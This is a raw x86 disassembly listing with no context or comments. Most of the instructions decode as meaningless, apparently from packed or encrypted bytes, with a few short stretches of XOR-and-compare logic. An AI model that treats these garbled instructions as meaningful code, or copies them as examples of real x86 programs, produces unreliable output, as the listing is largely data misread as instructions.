  40aea7:	in     al,0x9
  40aea9:	imul   edx,ebp,0x37d4ccc
  40aeaf:	loopne 0x40ae51
  40aeb1:	retf   0x2e99
  40aeb4:	inc    ebx
  40aeb5:	jle    0x40aed3
  40aeb7:	sbb    esi,edi
  40aeb9:	(bad)  
  40aeba:	fidiv  DWORD PTR ds:0xd935e785
  40aec0:	popa   
  40aec1:	es aam 0x42
  40aec4:	scas   al,BYTE PTR es:[edi]
  40aec5:	or     edi,DWORD PTR [ecx]
  40aec7:	mov    ch,0xfb
  40aec9:	in     eax,dx
  40aeca:	iret   
  40aecb:	out    0xca,al
  40aecd:	clc    
  40aece:	fisttp DWORD PTR [eax+ebp*4]
  40aed1:	mov    dh,0x32
  40aed3:	pop    edx
  40aed4:	jno    0x40ae7b
  40aed6:	cmp    DWORD PTR [edx+edx*8],ebp
  40aed9:	(bad)
  40aedd:	call   0x1969ff2a
  40aee2:	mov    edx,0x1b8f2db8
  40aee7:	ins    DWORD PTR es:[edi],dx
  40aee8:	add    ebx,DWORD PTR [edi+0x4]
  40aeeb:	cmp    ebx,DWORD PTR [ebx]
  40aeed:	(bad)
  40aef0:	mov    al,0x1b
  40aef2:	test   DWORD PTR [edi-0x69720a47],0x1a1de04c
  40aefc:	mov    DWORD PTR [eax],eax
  40aefe:	and    al,0xfd
  40af00:	sti    
  40af01:	outs   dx,BYTE PTR ds:[esi]
  40af02:	int3   
  40af03:	mov    esi,0x6d421521
  40af08:	pop    ds
  40af09:	dec    ecx
  40af0a:	lods   eax,DWORD PTR ds:[esi]
  40af0b:	cmp    dl,BYTE PTR [ebp-0x3b]
  40af0e:	gs xchg esp,eax
  40af10:	(bad)  
  40af12:	push   eax
  40af13:	jmp    0x3b1c:0xc0fd184d
  40af1a:	icebp  
  40af1b:	outs   dx,DWORD PTR ds:[esi]
  40af1c:	jp     0x40af07
  40af1e:	loop   0x40af41
  40af20:	push   es
  40af21:	shl    BYTE PTR [edi],1
  40af23:	xchg   ecx,eax
  40af24:	fs out dx,eax
  40af26:	sbb    ebp,DWORD PTR ds:0x280fd584
  40af2c:	jg     0x40aeed
  40af2e:	sbb    ecx,eax
  40af30:	mov    cl,0x22
  40af32:	test   eax,0xb607a8dd
  40af37:	mov    ds:0x2b18953a,eax
  40af3c:	or     edx,edi
  40af3e:	sti    
  40af3f:	es loope 0x40af61
  40af42:	sbb    BYTE PTR [ebp-0x7b],ah
  40af45:	add    eax,0xe19f7861
  40af4a:	pusha  
  40af4b:	cmp    ah,BYTE PTR [edx-0x44]
  40af4e:	out    0xae,al
  40af50:	loopne 0x40af2f
  40af52:	inc    esi
  40af53:	jecxz  0x40afc4
  40af55:	push   es
  40af56:	pop    edx
  40af57:	mov    ah,0x8d
  40af59:	mov    ch,0x81
  40af5b:	push   ecx
  40af5c:	ins    DWORD PTR es:[edi],dx
  40af5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af5e:	cmp    al,BYTE PTR [ecx-0x5c]
  40af61:	xchg   ecx,eax
  40af62:	int    0x76
  40af64:	mov    esp,0x8a4f0f2f
  40af69:	ins    DWORD PTR es:[edi],dx
  40af6a:	xchg   ebx,eax
  40af6b:	or     edx,DWORD PTR [esi]
  40af6d:	push   esi
  40af6e:	push   ebx
  40af6f:	sbb    BYTE PTR [edi+0x1f],0x9c
  40af73:	rol    DWORD PTR [edx+0x48],0x6e
  40af77:	xor    eax,0x52ea0a08
  40af7c:	(bad)  
  40af7d:	test   ecx,ecx
  40af7f:	aad    0x3f
  40af81:	(bad)  
  40af82:	jecxz  0x40af8c
  40af84:	repz ja 0x40af53
  40af87:	ins    DWORD PTR es:[edi],dx
  40af88:	dec    esi
  40af89:	sub    al,0x72
  40af8b:	fptan  
  40af8d:	sahf   
  40af8e:	adc    ecx,esi
  40af90:	pop    ecx
  40af91:	loopne 0x40af70
  40af93:	ret    
  40af94:	mov    al,ds:0x4831dc87
  40af99:	scas   eax,DWORD PTR es:[edi]
  40af9a:	mov    ebx,0xb113867a
  40af9f:	inc    ebx
  40afa0:	jns    0x40af2c
  40afa2:	cmp    dl,BYTE PTR [edi+ebx*2]
  40afa5:	stc    
  40afa6:	test   DWORD PTR [edi+0x6a0f5ce0],edi
  40afac:	jb     0x40afc1
  40afae:	sbb    edi,DWORD PTR [edi+esi*8-0x38]
  40afb2:	jns    0x40b02b
  40afb4:	sbb    BYTE PTR [ebx],al
  40afb6:	mov    bh,0x76
  40afb8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afba:	jl     0x40b02e
  40afbc:	jecxz  0x40af92
  40afbe:	scas   eax,DWORD PTR es:[edi]
  40afbf:	jl     0x40af8e
  40afc1:	push   eax
  40afc2:	shr    BYTE PTR [esi+0x19],1
  40afc5:	cwde   
  40afc6:	retf   
  40afc7:	pop    ebx
  40afc8:	mov    bl,0x41
  40afca:	push   eax
  40afcb:	jns    0x40b02b
  40afcd:	fmul   DWORD PTR [ecx+0x8bf45d]
  40afd3:	mov    cx,WORD PTR [ebp-0x4]
  40afd7:	movzx  ecx,cx
  40afda:	add    ecx,DWORD PTR [eax]
  40afdc:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40afe3:	mov    DWORD PTR [ebp-0x1c],ecx
  40afe6:	jmp    0x40b333
  40afeb:	js     0x40b055
  40afed:	adc    ebp,ebx
  40afef:	jae    0x40b062
  40aff1:	loopne 0x40b05c
  40aff3:	lfs    esi,FWORD PTR [edx]
  40aff6:	or     bl,cl
  40aff8:	adc    edx,DWORD PTR [ebp+0x7ee879db]
  40affe:	jle    0x40b02e
  40b000:	jge    0x40b080
  40b002:	jle    0x40afbd
  40b004:	std    
  40b005:	out    dx,al
  40b006:	jb     0x40b040
  40b008:	sub    DWORD PTR [ecx+0x46],ebx
  40b00b:	xlat   BYTE PTR ds:[ebx]
  40b00c:	sbb    al,0xda
  40b00e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b00f:	pop    edi
  40b010:	scas   al,BYTE PTR es:[edi]
  40b011:	sbb    BYTE PTR [edi+0x4d],al
  40b014:	inc    edi
  40b015:	pop    ecx
  40b016:	sub    ch,ch
  40b018:	jno    0x40b077
  40b01a:	stos   DWORD PTR es:[edi],eax
  40b01b:	dec    ebx
  40b01c:	in     eax,dx
  40b01d:	fst    DWORD PTR [ebx-0x14]
  40b020:	ds add eax,0x4cc05e15
  40b026:	shr    DWORD PTR ds:0x9d0eca6c,0xba
  40b02d:	adc    DWORD PTR [ebx-0x5ac00613],ebx
  40b033:	retf   
  40b034:	int3   
  40b035:	test   bl,bh
  40b037:	stc    
  40b038:	push   esi
  40b039:	sbb    cl,BYTE PTR ds:[edi+edx*4]
  40b03d:	mov    esi,0xbd26c4a2
  40b042:	mov    eax,0x5c57aa4f
  40b047:	mov    esi,0xdcdd44ad
  40b04c:	jns    0x40afeb
  40b04e:	jmp    0x40afe5
  40b050:	loopne 0x40aff3
  40b052:	jmp    DWORD PTR [ecx+0x4d32d38a]
  40b058:	shl    DWORD PTR [esi],cl
  40b05a:	cmp    BYTE PTR [ebp-0x5eb1b59b],0x2b
  40b061:	mov    ds:0x6606c03b,eax
  40b066:	stos   DWORD PTR es:[edi],eax
  40b067:	bound  ebp,QWORD PTR [ebp-0x192d49bf]
  40b06d:	mov    esp,0xc17a3981
  40b072:	call   DWORD PTR [ecx]
  40b074:	add    dh,dl
  40b076:	pop    edx
  40b077:	fwait
  40b078:	loop   0x40b020
  40b07a:	or     eax,0x1407166a
  40b07f:	jo     0x40b0f5
  40b081:	outs   dx,DWORD PTR ds:[esi]
  40b082:	in     eax,0x52
  40b084:	cld    
  40b085:	cmp    DWORD PTR [esi-0x35],edx
  40b088:	mov    dl,bh
  40b08a:	mov    ecx,0x55137dd0
  40b08f:	cld    
  40b090:	mov    al,0x92
  40b092:	mov    bl,0xd1
  40b094:	gs ds pop es
  40b097:	repnz aam 0x27
  40b09a:	rol    dh,cl
  40b09c:	dec    esp
  40b09d:	cmp    al,0xd5
  40b09f:	dec    ecx
  40b0a0:	xchg   edx,eax
  40b0a1:	xchg   esp,eax
  40b0a2:	scas   eax,DWORD PTR es:[edi]
  40b0a3:	and    BYTE PTR [eax-0x7627d57e],cl
  40b0a9:	nop
  40b0aa:	and    BYTE PTR [edi+0x3d],al
  40b0ad:	call   0x16c58952
  40b0b2:	rol    BYTE PTR [ecx+esi*8-0xcabb004],0xd8
  40b0ba:	(bad)  
  40b0bb:	lock pop eax
  40b0bd:	add    ecx,DWORD PTR [ebx+0x2bcd6ec1]
  40b0c3:	add    edx,esi
  40b0c5:	lea    esp,[ecx+ebx*1]
  40b0c8:	or     al,0x20
  40b0ca:	add    edi,DWORD PTR ds:0x77ab44a4
  40b0d0:	pop    eax
  40b0d1:	icebp  
  40b0d2:	sbb    esi,DWORD PTR [eax]
  40b0d4:	mov    ds:0x97f3eae5,eax
  40b0d9:	sub    al,0xdd
  40b0db:	mov    eax,ds:0x77a35480
  40b0e0:	push   edi
  40b0e1:	iret   
  40b0e2:	fwait
  40b0e3:	jp     0x40b0b5
  40b0e5:	xlat   BYTE PTR ds:[ebx]
  40b0e6:	mov    ?,WORD PTR [ebx-0x52]
  40b0e9:	dec    edx
  40b0ea:	loopne 0x40b158
  40b0ec:	jp     0x40b100
  40b0ee:	mov    al,0xbe
  40b0f0:	or     edx,DWORD PTR [ebp+0x54]
  40b0f3:	jb     0x40b076
  40b0f5:	pop    ebx
  40b0f6:	dec    esp
  40b0f7:	push   edi
  40b0f8:	imul   ecx,ebx,0xc8faffe1
  40b0fe:	inc    ebp
  40b0ff:	retf   
  40b100:	add    DWORD PTR [edi-0x15bdef9d],eax
  40b106:	in     eax,0x4e
  40b108:	fadd   DWORD PTR [edi-0x55]
  40b10b:	popf   
  40b10c:	aas    
  40b10d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b10e:	dec    ah
  40b110:	dec    esp
  40b111:	sbb    DWORD PTR [edi],esi
  40b113:	ins    DWORD PTR es:[edi],dx
  40b114:	popf   
  40b115:	iret   
  40b116:	retf   
  40b117:	ins    DWORD PTR es:[edi],dx
  40b118:	dec    ebp
  40b119:	xchg   edx,eax
  40b11a:	or     DWORD PTR [edx+0x1479c9bd],edx
  40b120:	jo     0x40b192
  40b122:	mov    ch,0xe3
  40b124:	mov    BYTE PTR [ebp+0x31667eb5],bh
  40b12a:	sub    bl,ah
  40b12c:	iret   
  40b12d:	or     dl,ah
  40b12f:	test   eax,0x211b0110
  40b134:	jge    0x40b0bc
  40b136:	daa    
  40b137:	popa   
  40b138:	jmp    0xf1899f32
  40b13d:	xor    BYTE PTR [eax+edi*4],ah
  40b140:	mov    DWORD PTR [eax-0x5a],ecx
  40b143:	cdq    
  40b144:	imul   edi
  40b146:	sbb    eax,0x2ca5efec
  40b14b:	inc    ecx
  40b14c:	pop    ss
  40b14d:	inc    esp
  40b14e:	cmc    
  40b14f:	xor    DWORD PTR [edi],esp
  40b151:	jo     0x40b11e
  40b153:	xchg   edi,eax
  40b154:	mov    dh,0x98
  40b156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b157:	les    esp,FWORD PTR ds:0x648ef905
  40b15d:	(bad)  
  40b15e:	or     ebx,DWORD PTR [esp+ebp*1-0x74]
  40b162:	iret   
  40b163:	adc    cl,BYTE PTR [edx-0x24]
  40b166:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b167:	mov    dl,0x70
  40b169:	stc    
  40b16a:	fimul  WORD PTR [esi-0x52336ac5]
  40b170:	dec    ecx
  40b171:	enter  0xcd28,0x3a
  40b175:	mov    eax,ds:0x845501ce
  40b17a:	int3   
  40b17b:	jnp    0x40b19e
  40b17d:	pop    cx
  40b17f:	or     eax,0x45c7f3bb
  40b184:	jmp    0xc284f297
  40b189:	cdq    
  40b18a:	push   ebx
  40b18b:	popf   
  40b18c:	xchg   edx,eax
  40b18e:	cmp    DWORD PTR [eax+0x537734fa],0x59
  40b195:	repnz pushf 
  40b197:	jl     0x40b1ba
  40b199:	out    0xaa,eax
  40b19b:	pop    es
  40b19c:	and    al,0xb6
  40b19e:	les    edx,FWORD PTR es:[edi+0x192c57c4]
  40b1a5:	out    0x3f,eax
  40b1a7:	bound  edx,QWORD PTR [eax]
  40b1a9:	mov    DWORD PTR [ebx-0x2c63acb7],eax
  40b1af:	adc    esp,DWORD PTR [ebx+0x21]
  40b1b2:	lds    esi,FWORD PTR [esi]
  40b1b4:	mov    esi,0x5d26d2ec
  40b1b9:	dec    esp
  40b1ba:	outs   dx,DWORD PTR ds:[esi]
  40b1bb:	or     DWORD PTR [ebp-0xf1705a],0x55
  40b1c2:	rol    BYTE PTR [ebp-0x3b],cl
  40b1c5:	cmp    bh,bl
  40b1c7:	out    0x54,eax
  40b1c9:	lds    esi,FWORD PTR [ecx-0x2417b197]
  40b1cf:	mov    edx,fs
  40b1d1:	xchg   ebp,esp
  40b1d3:	adc    al,0xb7
  40b1d5:	sub    al,0x5
  40b1d7:	push   esi
  40b1d8:	mov    edx,0x2de54ea3
  40b1dd:	call   0xc778c428
  40b1e2:	pop    edi
  40b1e3:	call   0x98c9:0x77ffcbd1
  40b1ea:	outs   dx,DWORD PTR ds:[esi]
  40b1eb:	add    ch,dl
  40b1ed:	lock pusha 
  40b1ef:	popa   
  40b1f0:	mov    ch,0x8b
  40b1f2:	lock shr BYTE PTR [eax],1
  40b1f5:	dec    esi
  40b1f6:	scas   eax,DWORD PTR es:[edi]
  40b1f7:	adc    al,0x8c
  40b1f9:	icebp  
  40b1fa:	push   ds
  40b1fb:	mov    esp,0x908c9719
  40b200:	pushf  
  40b201:	mov    eax,0x22bc2123
  40b206:	hlt    
  40b207:	mov    bh,0x47
  40b209:	imul   ebp,DWORD PTR [esi+eiz*2],0xffffffc2
  40b20d:	mov    bh,0x3a
  40b20f:	mov    dh,0xdc
  40b211:	test   al,0x96
  40b213:	sbb    eax,0x3c3ae6a4
  40b218:	pop    edi
  40b219:	(bad)  
  40b21a:	in     eax,dx
  40b21b:	shld   DWORD PTR [ebx+0x50a914ec],edi,cl
  40b222:	push   es
  40b223:	and    al,0x99
  40b225:	mov    dl,0xb1
  40b227:	mov    eax,0x9951c90c
  40b22c:	arpl   WORD PTR [ecx],si
  40b22e:	cmp    eax,DWORD PTR [edx+0x1544ee29]
  40b234:	mov    eax,0xeb95c8e6
  40b239:	lods   eax,DWORD PTR ds:[esi]
  40b23a:	xor    eax,0x8f26f7ea
  40b23f:	inc    edi
  40b240:	dec    esp
  40b241:	mov    ds:0xd319ecef,eax
  40b246:	les    ecx,FWORD PTR [eax]
  40b248:	pop    ebp
  40b249:	cmp    dh,BYTE PTR [ecx-0x207c0413]
  40b24f:	inc    esp
  40b250:	shl    dh,cl
  40b252:	cs jbe 0x40b251
  40b255:	pushf  
  40b256:	das    
  40b257:	jae    0x40b214
  40b259:	push   ss
  40b25a:	push   es
  40b25b:	sbb    BYTE PTR [esp+edi*8-0x89036f9],0xd3
  40b263:	cmp    cl,BYTE PTR [esi+0x18e321a0]
  40b269:	xchg   BYTE PTR [eax-0x42],dh
  40b26c:	sub    DWORD PTR [ebp-0x7c30a14],ebx
  40b272:	test   eax,0xba12edc6
  40b277:	or     eax,0xf66c2245
  40b27c:	cwde   
  40b27d:	test   al,0x7f
  40b27f:	jmp    0x3929fe33
  40b284:	mov    ebp,0x3099e3fd
  40b289:	test   DWORD PTR [eax],ebp
  40b28b:	dec    esp
  40b28c:	sti    
  40b28d:	cmp    ecx,ecx
  40b28f:	and    DWORD PTR [eax+ecx*8-0x669b4ed8],ecx
  40b296:	popf   
  40b297:	inc    edx
  40b298:	aaa    
  40b299:	mov    bl,0xc7
  40b29b:	pop    es
  40b29c:	and    DWORD PTR [edx-0x20],ebp
  40b29f:	fist   DWORD PTR [esi]
  40b2a1:	mov    dh,0xca
  40b2a3:	sub    DWORD PTR [esi+edx*4+0xddd3ef9],ebx
  40b2aa:	lods   al,BYTE PTR ds:[esi]
  40b2ab:	je     0x40b295
  40b2ad:	pop    edi
  40b2ae:	inc    edx
  40b2af:	rcr    ecx,1
  40b2b1:	sbb    esi,DWORD PTR [ebx-0xf]
  40b2b4:	aad    0x5e
  40b2b6:	cmp    BYTE PTR [ebx+0x40361706],al
  40b2bc:	mov    ah,0xba
  40b2be:	push   es
  40b2bf:	loopne 0x40b265
  40b2c1:	xor    eax,0x69e30d42
  40b2c6:	loopne 0x40b2bb
  40b2c8:	and    ah,ah
  40b2ca:	clc    
  40b2cb:	sub    DWORD PTR [esi+edx*4+0x58],0xbecf9c8d
  40b2d3:	int    0xaf
  40b2d5:	mov    esp,0xdd86e100
  40b2da:	adc    BYTE PTR [ebp-0x2bd79929],0x91
  40b2e1:	or     al,BYTE PTR [ecx+0x7b]
  40b2e4:	jns    0x40b337
  40b2e6:	fsub   st(1),st
  40b2e8:	data16 test al,0x28
  40b2eb:	push   edx
  40b2ec:	or     DWORD PTR [ecx-0x17],0xffffffda
  40b2f0:	jmp    0x8137904b
  40b2f5:	push   ecx
  40b2f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2f7:	punpcklbw mm0,DWORD PTR [ebx+0x2c]
  40b2fb:	mov    bh,0xab
  40b2fd:	mov    bl,0x78
  40b2ff:	stos   DWORD PTR es:[edi],eax
  40b300:	sahf   
  40b301:	pop    esi
  40b302:	mov    cl,0x60
  40b304:	or     ebx,DWORD PTR [edi-0x7b4648f0]
  40b30a:	and    ebp,DWORD PTR [esi]
  40b30c:	idiv   BYTE PTR [eax]
  40b30e:	mov    db4,edx
  40b311:	idiv   DWORD PTR [edx+0x4b]
  40b314:	sub    ch,BYTE PTR [edi+0x14451e19]
  40b31a:	pusha  
  40b31b:	xchg   edx,eax
  40b31c:	add    eax,esi
  40b31e:	in     al,dx
  40b31f:	jl     0x40b390
  40b321:	jb     0x40b36e
  40b323:	mov    ebp,0x6ef9bfda
  40b328:	add    DWORD PTR [esi],edx
  40b32a:	sub    al,0x24
  40b32c:	xor    DWORD PTR [ecx],ebx
  40b32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b32f:	mov    esi,0x8b40dee6
  40b334:	inc    ebp
  40b335:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b33b:	add    eax,edi
  40b33d:	cmp    DWORD PTR [ecx],eax
  40b33f:	jne    0x40c44a
  40b345:	mov    eax,DWORD PTR [ebp+0x8]
  40b348:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b34b:	xor    eax,esi
  40b34d:	add    eax,edi
  40b34f:	cmp    DWORD PTR [ecx],eax
  40b351:	jne    0x40b6c1
  40b357:	mov    eax,DWORD PTR [ebp+0x8]
  40b35a:	mov    ecx,DWORD PTR [ebp-0x10]
  40b35d:	xor    eax,esi
  40b35f:	add    eax,edi
  40b361:	mov    DWORD PTR [ecx],eax
  40b363:	jmp    0x40b6b0
  40b368:	cmp    eax,0xe9fdcd2a
  40b36d:	pop    ecx
  40b36e:	dec    ebp
  40b36f:	push   0x46
  40b371:	aam    0xcc
  40b373:	int3   
  40b374:	push   esi
  40b375:	sahf   
  40b376:	cld    
  40b377:	stos   BYTE PTR es:[edi],al
  40b378:	sub    edi,esi
  40b37a:	jle    0x40b3fa
  40b37c:	cs jge 0x40b3fd
  40b37f:	jle    0x40b38e
  40b381:	je     0x40b30a
  40b383:	jp     0x40b3f6
  40b385:	mov    al,ds:0x81e78061
  40b38a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b38b:	sahf   
  40b38c:	aaa    
  40b38d:	mov    al,0xf6
  40b38f:	add    eax,0xc0504e85
  40b394:	into   
  40b395:	and    ecx,DWORD PTR [ebx-0x6c]
  40b398:	jl     0x40b337
  40b39a:	dec    esi
  40b39b:	data16 fsub DWORD PTR [ecx-0x55]
  40b39f:	or     al,0x9f
  40b3a1:	fisttp WORD PTR [edx]
  40b3a3:	and    eax,ebp
  40b3a5:	xor    edi,DWORD PTR [edi-0x1c42d26c]
  40b3ab:	inc    ecx
  40b3ac:	inc    ebp
  40b3ad:	push   ebp
  40b3ae:	push   ecx
  40b3af:	mov    esi,0x5fe54ce5
  40b3b4:	je     0x40b372
  40b3b6:	cmp    BYTE PTR [eax+0x5a50d223],bh
  40b3bc:	std    
  40b3bd:	fadd   QWORD PTR [eax-0x5207728]
  40b3c3:	push   ds
  40b3c4:	jns    0x40b397
  40b3c6:	out    dx,eax
  40b3c7:	adc    DWORD PTR [ebx-0x2677488a],edx
  40b3cd:	inc    ebp
  40b3ce:	jp     0x40b39e
  40b3d0:	pop    ebx
  40b3d1:	mov    ecx,0x71a82d15
  40b3d6:	adc    ecx,eax
  40b3d8:	push   ebx
  40b3d9:	retf   
  40b3da:	aad    0xd3
  40b3dc:	fdivr  QWORD PTR [ecx]
  40b3de:	daa    
  40b3df:	pushf  
  40b3e0:	inc    esi
  40b3e1:	sti    
  40b3e2:	push   esi
  40b3e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3e4:	add    DWORD PTR [edx],0x79
  40b3e7:	in     eax,0xeb
  40b3e9:	stos   DWORD PTR es:[edi],eax
  40b3ea:	mov    ah,0xbd
  40b3ec:	(bad)  
  40b3ee:	retf   
  40b3ef:	push   ss
  40b3f0:	dec    ecx
  40b3f1:	sbb    al,BYTE PTR [edx+0x12]
  40b3f4:	pop    es
  40b3f5:	icebp  
  40b3f6:	adc    BYTE PTR [edi+0x3e],0x1
  40b3fa:	sbb    edx,DWORD PTR [edi+0x509923d5]
  40b400:	fist   WORD PTR [ebp-0x52]
  40b403:	sub    edi,eax
  40b405:	push   ebp
  40b406:	mov    dl,0x75
  40b408:	in     eax,0x49
  40b40a:	(bad)  
  40b40b:	out    0xe4,eax
  40b40d:	retf   
  40b40e:	nop
  40b40f:	mov    WORD PTR [edx-0x76],ss
  40b412:	sub    DWORD PTR [ecx+0x79223a49],ecx
  40b418:	mov    WORD PTR [ebp-0x1a306f70],gs
  40b41e:	mov    edx,0x5b54660f
  40b423:	aas    
  40b424:	fidiv  DWORD PTR [edx+0x4aa4adbd]
  40b42a:	out    dx,eax
  40b42b:	sub    esi,ebx
  40b42d:	jp     0x40b3d2
  40b42f:	xchg   esi,eax
  40b430:	sub    DWORD PTR [eax-0x54ec021c],0x816fe1ad
  40b43a:	add    ah,BYTE PTR [edi+edi*8+0xe]
  40b43e:	adc    eax,0xbfe1d01
  40b443:	jnp    0x40b495
  40b445:	outs   dx,DWORD PTR ds:[esi]
  40b446:	mov    dl,BYTE PTR [edx]
  40b448:	outs   dx,BYTE PTR ds:[esi]
  40b449:	aas    
  40b44a:	sti    
  40b44b:	add    edx,DWORD PTR [edx+0x5e]
  40b44e:	clc    
  40b44f:	sbb    al,0x8c
  40b451:	dec    ebp
  40b452:	sub    al,0x2c
  40b454:	out    0xc1,eax
  40b456:	imul   esi,ebp,0xb7371b4f
  40b45c:	inc    ebp
  40b45d:	sub    eax,0xe0eb1ca7
  40b462:	sub    esp,0x3380878
  40b468:	or     ch,cl
  40b46a:	lea    ecx,[edx+0x3f0b08dc]
  40b470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b471:	mov    edi,0x7ac13560
  40b476:	cs mov bh,0xd9
  40b479:	jge    0x40b4d5
  40b47b:	mov    esi,0xc964aa31
  40b480:	mov    WORD PTR [edi+eax*4+0x7bc7524d],ds
  40b487:	sub    DWORD PTR [ecx],esi
  40b489:	cli    
  40b48a:	mov    esp,fs
  40b48c:	xchg   esi,eax
  40b48d:	xchg   esi,eax
  40b48e:	nop    ebx
  40b491:	mov    ecx,0x7bf09286
  40b496:	jp     0x40b4e9
  40b498:	pop    ecx
  40b499:	scas   eax,DWORD PTR es:[edi]
  40b49a:	(bad)  
  40b49c:	sub    edx,DWORD PTR [ecx+ebx*4]
  40b49f:	sbb    esi,DWORD PTR [edi+0x12]
  40b4a2:	cmp    BYTE PTR ds:0x54401427,dh
  40b4a8:	mov    cs,eax
  40b4aa:	fstp   DWORD PTR [ebx]
  40b4ac:	outs   dx,BYTE PTR ds:[esi]
  40b4ad:	retf   
  40b4ae:	sbb    ecx,DWORD PTR [ebx-0x3e02ab8c]
  40b4b4:	and    eax,0xecebcb12
  40b4b9:	in     eax,0x5d
  40b4bb:	in     al,dx
  40b4bc:	into   
  40b4bd:	add    eax,0xae3a703b
  40b4c2:	retf   
  40b4c3:	dec    esi
  40b4c4:	jp     0x40b4fb
  40b4c6:	retf   0x1b1
  40b4c9:	add    eax,0x114a5b99
  40b4ce:	aam    0xf0
  40b4d0:	jp     0x40b465
  40b4d2:	mov    DWORD PTR [ebp-0x28],eax
  40b4d5:	aad    0x77
  40b4d7:	in     eax,dx
  40b4d8:	or     eax,0xcb9f87b1
  40b4dd:	aad    0xb8
  40b4df:	mov    BYTE PTR [ecx+0x25],cl
  40b4e2:	mov    ecx,0xa7067175
  40b4e7:	stos   DWORD PTR es:[edi],eax
  40b4e8:	push   esp
  40b4e9:	mov    dh,0x2f
  40b4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4ec:	xor    ch,dl
  40b4ee:	sbb    al,0x89
  40b4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f1:	std    
  40b4f2:	lods   eax,DWORD PTR ds:[esi]
  40b4f3:	daa    
  40b4f4:	push   ds
  40b4f5:	push   0x72b0d91f
  40b4fa:	inc    esi
  40b4fb:	daa    
  40b4fc:	cmp    ebp,DWORD PTR [ebx+0xc]
  40b4ff:	and    eax,0x54
  40b502:	mov    esi,0xef94207f
  40b507:	mov    al,0x77
  40b509:	jne    0x40b587
  40b50b:	mov    ebx,0xa90ef073
  40b510:	test   DWORD PTR [ebp+ebp*1-0x5b],esi
  40b514:	xchg   ecx,eax
  40b515:	iret   
  40b516:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b517:	lods   al,BYTE PTR ds:[esi]
  40b518:	push   esp
  40b519:	fisubr DWORD PTR [eax-0x6a]
  40b51c:	arpl   WORD PTR [eax+ebp*4],cx
  40b51f:	xchg   ebx,eax
  40b520:	lds    edx,FWORD PTR ss:[ebx+0x59]
  40b524:	std    
  40b525:	add    BYTE PTR [edi+0x60a857c5],dl
  40b52b:	push   cs
  40b52c:	retf   0x4e36
  40b52f:	pop    ss
  40b530:	scas   eax,DWORD PTR es:[edi]
  40b531:	test   eax,0x844db902
  40b536:	jno    0x40b593
  40b538:	push   ds
  40b539:	std    
  40b53a:	pop    es
  40b53b:	add    eax,DWORD PTR [edi+0x24]
  40b53e:	pop    esp
  40b53f:	inc    edi
  40b540:	pop    ss
  40b541:	inc    eax
  40b542:	xchg   edi,eax
  40b543:	inc    esi
  40b544:	push   ecx
  40b545:	imul   bl
  40b547:	mov    bh,0xc0
  40b549:	ret    0x2bb1
  40b54c:	jo     0x40b53a
  40b54e:	dec    esi
  40b54f:	into   
  40b550:	test   cl,bl
  40b552:	daa    
  40b553:	fidiv  WORD PTR [ebx+0x26]
  40b556:	hlt    
  40b557:	retf   0x4691
  40b55a:	out    0x7,eax
  40b55c:	xor    BYTE PTR [ebp-0x3d],0x75
  40b560:	cmp    al,0xd8
  40b562:	mov    bl,0xf3
  40b564:	add    esp,esi
  40b566:	add    eax,0xcd98c1c2
  40b56b:	in     eax,dx
  40b56c:	outs   dx,BYTE PTR ds:[esi]
  40b56d:	(bad)  
  40b56e:	fld    TBYTE PTR ds:0x54f6aa29
  40b574:	in     al,0xbc
  40b576:	(bad)  
  40b577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b578:	out    dx,eax
  40b579:	retf   
  40b57a:	mov    ebp,0x9a79107f
  40b57f:	sub    eax,ebx
  40b581:	mov    eax,ds:0xcde1c8bb
  40b586:	ret    
  40b587:	xchg   ebx,eax
  40b588:	in     al,dx
  40b589:	rcl    DWORD PTR [ebp-0x1a993eb8],1
  40b58f:	pop    ebp
  40b590:	scas   eax,DWORD PTR es:[edi]
  40b591:	cmp    ebx,edi
  40b593:	jle    0x40b56a
  40b595:	out    dx,eax
  40b596:	or     cl,BYTE PTR [ecx+0x4]
  40b599:	mov    bl,BYTE PTR [esi+eiz*8+0x9]
  40b59d:	xor    BYTE PTR [eax*1+0x70433934],dh
  40b5a4:	stos   BYTE PTR es:[edi],al
  40b5a5:	ss test al,0x58
  40b5a8:	mov    dh,0xb
  40b5aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5ab:	pop    esp
  40b5ac:	scas   al,BYTE PTR es:[edi]
  40b5ad:	inc    esi
  40b5ae:	xor    dl,bl
  40b5b0:	nop
  40b5b1:	cdq    
  40b5b2:	ror    DWORD PTR ds:0xddd93c66,cl
  40b5b8:	js     0x40b56d
  40b5ba:	dec    esp
  40b5bb:	cli    
  40b5bc:	ja     0x40b550
  40b5be:	dec    BYTE PTR [ecx-0x1c271d11]
  40b5c4:	rol    DWORD PTR [ecx+0x2d660a4a],0xc
  40b5cb:	daa    
  40b5cc:	xor    eax,0x8f72c556
  40b5d1:	mov    cl,0x79
  40b5d3:	jno    0x40b618
  40b5d5:	int3   
  40b5d6:	into   
  40b5d7:	scas   al,BYTE PTR es:[edi]
  40b5d8:	in     al,0xb1
  40b5da:	aas    
  40b5db:	cwde   
  40b5dc:	dec    edx
  40b5dd:	sub    dh,0xf0
  40b5e0:	xchg   edx,eax
  40b5e1:	mov    ds,WORD PTR [edi+ebx*1-0x47]
  40b5e5:	pop    ebx
  40b5e6:	xchg   edx,eax
  40b5e7:	nop
  40b5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5e9:	xchg   esp,eax
  40b5ea:	pop    ss
